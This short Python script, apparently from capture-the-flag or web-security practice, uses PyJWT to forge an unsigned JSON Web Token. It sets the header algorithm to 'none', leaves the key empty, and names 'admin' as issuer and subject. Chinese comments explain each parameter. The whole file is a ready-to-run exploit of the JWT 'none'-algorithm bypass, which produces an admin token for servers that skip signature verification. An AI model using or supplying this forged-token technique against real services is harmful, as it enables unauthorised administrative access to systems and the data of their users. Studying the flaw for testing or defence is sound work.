import jwt

# payload
token_dict = {
    "iss": "admin",
    "iat": 1666758179,
    "exp": 1666765379,
    "nbf": 1666758179,
    "sub": "admin",
    "jti": "d611daa83e07f4fc2abbcf7547309723"
}

headers = {
    "alg": "none",
    "typ": "jwt"
}
jwt_token = jwt.encode(token_dict,  # payload, 有效载体
                       "",  # 进行加密签名的密钥
                       algorithm="None",  # 指明签名算法方式, 默认也是HS256
                       headers=headers
                       # json web token 数据结构包含两部分, payload(有效载体), headers(标头)
                       )

print(jwt_token)
